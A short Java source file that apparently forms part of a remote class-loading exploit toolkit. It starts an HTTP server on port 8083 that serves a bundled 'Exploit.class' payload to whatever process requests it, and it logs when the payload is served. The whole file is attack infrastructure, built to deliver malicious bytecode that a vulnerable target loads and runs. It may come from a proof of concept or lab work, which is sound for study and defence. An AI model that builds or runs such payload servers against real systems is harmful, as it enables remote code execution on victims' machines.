import com.sun.net.httpserver.HttpServer;

import java.net.InetSocketAddress;

public class PayloadHTTPServer extends Thread {
	@Override
	public void run() {
		try (var is = this.getContextClassLoader().getResourceAsStream("Exploit.class")) {
			@SuppressWarnings("DataFlowIssue")
			var payload = is.readAllBytes();

			var server = HttpServer.create(new InetSocketAddress(8083), 0);
			server.createContext("/Exploit.class", httpExchange -> {
				System.out.println("!! Serving payload");
				httpExchange.sendResponseHeaders(200, payload.length);
				var os = httpExchange.getResponseBody();
				os.write(payload);
				os.close();
			});
			server.setExecutor(null);
			server.start();
			System.out.println("!! HTTP listening on :8083");
		} catch (Exception e) {
			//noinspection CallToPrintStackTrace
			e.printStackTrace();
		}
	}
}
